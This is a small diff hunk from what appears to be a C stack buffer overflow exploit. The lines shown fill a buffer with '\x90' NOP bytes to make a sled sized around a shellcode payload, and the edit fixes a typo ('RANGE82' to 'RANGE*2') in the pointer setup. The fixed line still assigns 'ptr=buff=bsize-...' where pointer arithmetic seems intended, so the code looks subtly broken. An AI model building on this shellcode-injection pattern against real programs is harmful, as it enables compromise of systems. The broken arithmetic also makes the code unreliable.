@@ -45,7 +45,7 @@ main(int argc,char* argv[])
 for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
 		buff[i]='\x90';
 		
-	ptr=buff=bsize-RANGE82-strlen(shellcode)-1;
+	ptr=buff=bsize-RANGE*2-strlen(shellcode)-1;
 	
 	 }
 	 
